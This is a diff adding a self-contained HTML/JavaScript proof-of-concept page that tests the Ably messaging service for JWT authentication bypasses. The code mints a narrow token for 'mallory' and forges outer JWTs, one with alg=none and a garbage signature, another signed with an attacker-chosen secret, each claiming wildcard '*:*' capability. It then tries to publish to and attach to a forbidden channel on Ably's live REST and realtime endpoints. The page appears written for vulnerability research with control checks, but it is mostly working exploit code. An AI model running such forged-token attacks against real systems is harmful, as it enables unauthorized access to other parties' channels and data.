@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Ably A2.7 v3 — TEST6 + TEST7 only (SDK-free)</title>
+<style>body{font-family:monospace;margin:16px}input{width:420px}pre{background:#f4f4f4;padding:12px;overflow:auto;white-space:pre-wrap}</style>
+</head>
+<body>
+<h3>Ably A2.7 v3 — TEST6 (alg=none) + TEST7 (realtime *:* attach) + WS controls</h3>
+<p>SDK-free. Paste ROOT API key as <code>name:secret</code>, then click Run. The key is used only in this page to call rest.ably.io / realtime.ably.io; it is never sent anywhere else.</p>
+<input id="key" type="password" placeholder="appId.keyId:secret" autocomplete="off">
+<button id="run">Run TEST6+TEST7</button>
+<span id="status"></span>
+<pre id="r2s5-results">Not started.
+</pre>
+<script>
+document.getElementById('run').addEventListener('click', async () => {
+  const btn = document.getElementById('run');
+  const status = document.getElementById('status');
+  const pre = document.getElementById('r2s5-results');
+  btn.disabled = true; status.textContent = 'Running...';
+  pre.textContent = 'A2.7 v3 (TEST6+TEST7) running...\n';
+  const log = (...a) => { const s = a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '); pre.textContent += s + '\n'; console.log(...a); };
+  try {
+    const ks = document.getElementById('key').value.trim();
+    if (!ks || ks.indexOf(':') < 0) { log('ABORT: no key'); status.textContent = 'Aborted (no key).'; btn.disabled = false; return; }
+    const ci = ks.indexOf(':'); const ROOT = { name: ks.slice(0, ci), secret: ks.slice(ci + 1) };
+    const REST = 'https://rest.ably.io';
+    const b64url = b => btoa(String.fromCharCode(...new Uint8Array(b))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    const b64urlStr = s => b64url(new TextEncoder().encode(s));
+    const b64std = b => btoa(String.fromCharCode(...new Uint8Array(b)));
+    async function hs256raw(msg, secret) { const k = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']); return await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(msg)); }
+    async function hs256(msg, secret) { return b64url(await hs256raw(msg, secret)); }
+    function c14n(cap) { if (!cap) return ''; const out = {}; Object.keys(cap).sort().forEach(k => { out[k] = [...cap[k]].sort(); }); return JSON.stringify(out); }
+    async function mintToken(key, { clientId = '', capability = null, ttl = 3600000 } = {}) {
+      const timestamp = Date.now();
+      const nonce = [...crypto.getRandomValues(new Uint8Array(8))].map(b => b.toString(16).padStart(2, '0')).join('');
+      const capStr = c14n(capability);
+      const signText = key.name + '\n' + ttl + '\n' + capStr + '\n' + clientId + '\n' + timestamp + '\n' + nonce + '\n';
+      const mac = b64std(await hs256raw(signText, key.secret));
+      const body = { keyName: key.name, ttl, capability: capStr, timestamp, nonce, mac };
+      if (clientId) body.clientId = clientId;
+      const r = await fetch(REST + '/keys/' + encodeURIComponent(key.name) + '/requestToken', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic ' + btoa(key.name + ':' + key.secret) }, body: JSON.stringify(body) });
+      const text = await r.text();
+      if (r.status !== 200 && r.status !== 201) throw new Error('requestToken failed ' + r.status + ' ' + text.slice(0, 300));
+      return JSON.parse(text).token;
+    }
+    async function restCall(method, path, { token = null, key = null, body = null } = {}) { const h = { 'Content-Type': 'application/json' }; if (token) h['Authorization'] = 'Bearer ' + token; if (key) h['Authorization'] = 'Basic ' + btoa(key.name + ':' + key.secret); const r = await fetch(REST + path, { method, headers: h, body: body ? JSON.stringify(body) : null }); const text = await r.text(); let json = null; try { json = JSON.parse(text); } catch {} return { status: r.status, json, text, errCode: r.headers.get('X-Ably-Errorcode') }; }
+    function wsAttach(token, channel, timeoutMs = 15000) {
+      return new Promise((resolve) => {
+        let ws;
+        try { ws = new WebSocket('wss://realtime.ably.io/?access_token=' + encodeURIComponent(token) + '&v=2&format=json'); } catch (e) { resolve({ attached: false, error: 'ws-construct: ' + e.message }); return; }
+        let done = false;
+        const timer = setTimeout(() => finish({ attached: false, error: 'timeout waiting for attach result' }), timeoutMs);
+        const finish = (res) => { if (done) return; done = true; clearTimeout(timer); try { ws.close(); } catch {} resolve(res); };
+        ws.onmessage = (ev) => {
+          let m; try { m = JSON.parse(ev.data); } catch { return; }
+          if (m.action === 4) { ws.send(JSON.stringify({ action: 10, channel })); return; }
+          if (m.action === 11 && m.channel === channel) { finish({ attached: true }); return; }
+          if (m.action === 9) { finish({ attached: false, error: 'ERROR ' + JSON.stringify(m.error) }); return; }
+        };
+        ws.onerror = () => finish({ attached: false, error: 'websocket error' });
+        ws.onclose = (e) => { if (!done) finish({ attached: false, error: 'ws closed code=' + e.code + ' reason=' + (e.reason || '') }); };
+      });
+    }
+    const narrowTok = await mintToken(ROOT, { clientId: 'mallory', capability: { 'r2s5-allowed': ['subscribe'] } });
+    log('narrow token issued (clientId mallory, r2s5-allowed subscribe).');
+    async function embed(inner, { outerClaims = {} } = {}) { const now = Math.floor(Date.now() / 1000); const header = { typ: 'JWT', alg: 'HS256', 'x-ably-token': inner }; const claims = { iat: now, exp: now + 3600, ...outerClaims }; const u = b64urlStr(JSON.stringify(header)) + '.' + b64urlStr(JSON.stringify(claims)); return u + '.' + await hs256(u, 'attacker-chosen-secret-nobody-verifies'); }
+    const w1 = await embed(narrowTok, { outerClaims: { 'x-ably-capability': JSON.stringify({ '*': ['*'] }) } });
+    // WS controls first
+    const c1 = await wsAttach(narrowTok, 'r2s5-allowed');
+    log('[C-WS1] narrow token realtime attach r2s5-allowed => ' + (c1.attached ? 'ATTACHED (control OK)' : 'FAILED (control broken?): ' + (c1.error || '')));
+    const c2 = await wsAttach(narrowTok, 'r2s5-forbidden');
+    log('[C-WS2] narrow token realtime attach r2s5-forbidden => ' + (c2.attached ? 'ATTACHED (UNEXPECTED - control broken)' : 'DENIED as expected: ' + (c2.error || '')));
+    // TEST6: alg=none outer + garbage signature + capability *:*
+    const now6 = Math.floor(Date.now() / 1000);
+    const h6 = b64urlStr(JSON.stringify({ typ: 'JWT', alg: 'none', 'x-ably-token': narrowTok }));
+    const c6 = b64urlStr(JSON.stringify({ iat: now6, exp: now6 + 3600, 'x-ably-capability': JSON.stringify({ '*': ['*'] }) }));
+    const w6 = h6 + '.' + c6 + '.garbage';
+    let r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w6, body: { name: 'x', data: 'pwn' } });
+    log('[TEST6] outer alg=none + garbage signature + capability *:* publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE (Critical)' : (r.status === 401 || r.status === 403) ? 'SAFE (DENY)' : 'OTHER ' + r.status));
+    // TEST7: realtime attach r2s5-forbidden with TEST1 token (outer capability *:*)
+    const a7 = await wsAttach(w1, 'r2s5-forbidden');
+    log('[TEST7] realtime attach r2s5-forbidden with TEST1 token (outer *:* capability) => ' + (a7.attached ? 'ATTACHED (VULNERABLE - outer claim honored on realtime!)' : 'DENIED as expected (SAFE): ' + (a7.error || '')));
+    log('A2.7 v3 DONE.');
+    status.textContent = 'Done.';
+  } catch (e) {
+    log('HARNESS ERROR: ' + (e && e.stack ? e.stack : e));
+    status.textContent = 'Error.';
+  }
+  btn.disabled = false;
+});
+</script>
+</body>
+</html>
